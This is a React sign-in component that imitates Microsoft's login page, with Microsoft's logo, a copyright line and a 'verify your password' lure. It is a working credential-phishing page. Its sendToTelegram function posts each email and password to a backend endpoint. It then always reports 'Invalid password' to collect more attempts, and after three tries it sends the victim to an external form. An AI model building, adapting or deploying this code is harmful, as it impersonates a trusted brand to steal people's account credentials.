import { useState, useRef, useEffect } from 'react';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';

type LoginStep = 'email' | 'password';

export default function Login() {
  const [currentStep, setCurrentStep] = useState<LoginStep>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);

  const emailInputRef = useRef<HTMLInputElement>(null);
  const passwordInputRef = useRef<HTMLInputElement>(null);
  const alertTimerRef = useRef<NodeJS.Timeout | null>(null);

  // Focus inputs when step changes
  useEffect(() => {
    if (currentStep === 'email' && emailInputRef.current) {
      emailInputRef.current.focus();
    } else if (currentStep === 'password' && passwordInputRef.current) {
      passwordInputRef.current.focus();
    }
  }, [currentStep]);

  // Debug errorMessage state changes
  useEffect(() => {
    console.log('errorMessage state changed to:', errorMessage);
  }, [errorMessage]);

  const showAlert = (message: string) => {
    console.log('showAlert called with message:', message);
    if (alertTimerRef.current) {
      clearTimeout(alertTimerRef.current);
      alertTimerRef.current = null;
    }
    
    setErrorMessage(message);
    console.log('errorMessage state set to:', message);
    alertTimerRef.current = setTimeout(() => {
      console.log('Alert timeout reached, clearing message');
      setErrorMessage('');
      alertTimerRef.current = null;
    }, 3000);
  };

  const isValidEmail = (email: string) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  };

  const handleNext = () => {
    if (!email.trim()) {
      showAlert('Please enter your email address.');
      return;
    }
    
    if (!isValidEmail(email)) {
      showAlert('Please enter a valid email address.');
      return;
    }
    
    setCurrentStep('password');
    setErrorMessage('');
  };

  const handleChangeEmail = () => {
    setCurrentStep('email');
    setErrorMessage('');
    setPassword('');
  };

  const sendToTelegram = async (email: string, password: string) => {
    try {
      await fetch('/api/send-login-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password
        })
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!password.trim()) {
      showAlert('Please enter your password.');
      return;
    }

    setIsLoading(true);
    const newAttemptCount = attemptCount + 1;
    setAttemptCount(newAttemptCount);

    try {
      // Send login data to Telegram
      await sendToTelegram(email, password);
      
      // Simulate API call delay
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      if (newAttemptCount >= 3) {
        // After 3 attempts, redirect 
        window.location.href = 'https://share-na2.hsforms.com/20cKGHRLBQWCU7Np-uAmQTg418yzw';
        return;
      }

      // For demo purposes, always show invalid password
      throw new Error('Invalid credentials');
      
    } catch (error) {
      console.log('Login error caught:', error);
      setIsLoading(false);
      setPassword('');
      // Small delay to ensure loading state is updated before showing alert
      setTimeout(() => {
        showAlert('Invalid password. Please try again.');
      }, 100);
    }
  };

  const handleEmailKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleNext();
    }
  };

  const handlePasswordKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleLogin(e);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-microsoft-background">
      <div className="w-full max-w-sm bg-white/95 backdrop-blur-sm rounded-xl shadow-lg p-8 text-center">
        {/* Microsoft Logo */}
        <div className="mb-2">
          <img 
            src="https://cdn.freebiesupply.com/logos/thumbs/2x/microsoft-logo.png" 
            alt="Microsoft Logo" 
            className="w-44 h-auto block"
          />
        </div>

        {/* Security Notice */}
        <p className="text-sm text-gray-600 mb-4">
          Because you're accessing sensitive info, you need to verify your password
        </p>

        <h2 className="text-xl font-semibold text-gray-900 mb-6">Sign in</h2>

        <form onSubmit={handleLogin} className="space-y-4">
          {/* Email Step */}
          {currentStep === 'email' && (
            <div className="space-y-4">
              <div className="text-left">
                <Label htmlFor="email" className="block text-sm font-medium text-gray-900 mb-1">
                  Email address
                </Label>
                <Input
                  ref={emailInputRef}
                  type="email"
                  id="email"
                  name="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  onKeyPress={handleEmailKeyPress}
                  className="w-full"
                  placeholder="Enter your email"
                  data-testid="input-email"
                />
              </div>
              <Button 
                type="button"
                onClick={handleNext}
                className="w-full bg-microsoft-blue hover:bg-microsoft-blue-hover text-white font-semibold"
                data-testid="button-next"
              >
                Next
              </Button>
            </div>
          )}

          {/* Password Step */}
          {currentStep === 'password' && (
            <div className="space-y-4">
              {/* User Email Display */}
              <div className="text-left">
                <p className="text-sm text-gray-900 mt-2 break-all">
                  <span data-testid="text-user-email">{email}</span>
                  <span 
                    onClick={handleChangeEmail}
                    className="text-microsoft-blue cursor-pointer ml-2 text-xs hover:underline"
                    data-testid="button-change-email"
                  >
                    Change
                  </span>
                </p>
              </div>

              <div className="text-left">
                <Label htmlFor="password" className="block text-sm font-medium text-gray-900 mb-1">
                  Password
                </Label>
                <Input
                  ref={passwordInputRef}
                  type="password"
                  id="password"
                  name="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyPress={handlePasswordKeyPress}
                  className="w-full"
                  placeholder="Enter your password"
                  data-testid="input-password"
                />
              </div>

              <Button 
                type="submit"
                disabled={isLoading}
                className="w-full bg-microsoft-blue hover:bg-microsoft-blue-hover text-white font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
                data-testid="button-login"
              >
                Login
              </Button>

              {/* Loading State */}
              {isLoading && (
                <div className="text-center" data-testid="loading-indicator">
                  <p className="text-sm text-gray-600">
                    Logging in
                    <span className="inline-block w-4 text-left">
                      <span className="inline-block animate-loading-dot loading-dot-1">.</span>
                      <span className="inline-block animate-loading-dot loading-dot-2">.</span>
                      <span className="inline-block animate-loading-dot loading-dot-3">.</span>
                    </span>
                  </p>
                </div>
              )}

            </div>
          )}
        </form>

        {/* Error Alert - Outside conditionals so it shows for both steps */}
        {errorMessage && (
          <div 
            className="mt-4 p-3 bg-red-50 border border-red-200 rounded-md"
            role="alert" 
            aria-live="polite"
            data-testid="alert-error"
          >
            <p className="text-sm text-red-800">
              {errorMessage}
            </p>
          </div>
        )}

        {/* Footer */}
        <div className="mt-6">
          <p className="text-xs text-gray-600">© Microsoft</p>
        </div>
      </div>
    </div>
  );
}
